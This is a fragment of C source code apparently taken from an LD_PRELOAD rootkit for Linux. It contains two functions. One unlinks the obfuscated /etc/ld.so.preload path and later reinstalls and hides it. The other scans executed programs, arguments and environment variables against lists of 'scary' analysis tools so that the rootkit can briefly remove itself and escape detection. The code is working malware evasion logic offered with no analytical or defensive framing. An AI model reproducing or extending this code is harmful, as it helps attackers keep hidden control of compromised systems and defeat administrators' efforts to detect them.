static int remove_self(void){
	if(not_user(0))
		return VINVALID_PERM;
	hook(CUNLINK);
	xor(tldso_preload, LDSO_PRELOAD);
	call(CUNLINK, tldso_preload);
	clean(tldso_preload);
	pid_t pid;
	if((pid = fork()) == -1)
		return VFORK_ERR;
	else if(pid == 0)
		return VFORK_SUC;
	wait(NULL);
	reinstall();
	if(!xhide_path(LDSO_PRELOAD))
		xhide_path(LDSO_PRELOAD);
	return VEVADE_DONE;
}

static int evade(const char *filename, char *const argv[], char *const envp[]){
	char *scary_proc, *scary_path;
	int i, ii;
	for(i = 0; i < SCARY_PROCS_SIZE; i++){
		scary_proc = scary_procs[i];
		char path[PATH_MAX/3];
		snprintf(path, sizeof(path), "*/%s", scary_proc);
		if(process(scary_proc))
			return remove_self();
		else
			if(strstr(filename, scary_proc))
				return remove_self();
			else if(!fnmatch(path, filename, FNM_PATHNAME))
				return remove_self();
	}
	for(i = 0; i < SCARY_PATHS_SIZE; i++){
		scary_path = scary_paths[i];
		if(!fnmatch(scary_path, filename, FNM_PATHNAME) || strstr(filename, scary_path))
			for(ii = 0; argv[ii] != NULL; ii++)
				if(!strncmp("--list", argv[ii], 6))
					return remove_self();
	}
	if(envp != NULL)
		for(i = 0; envp[i] != NULL; i++)
			for(ii = 0; ii < SCARY_VARIABLES_SIZE; ii++)
				if(!strncmp(scary_variables[ii], envp[i], strlen(scary_variables[ii])))
					return remove_self();
	return VNOTHING_DONE;
}
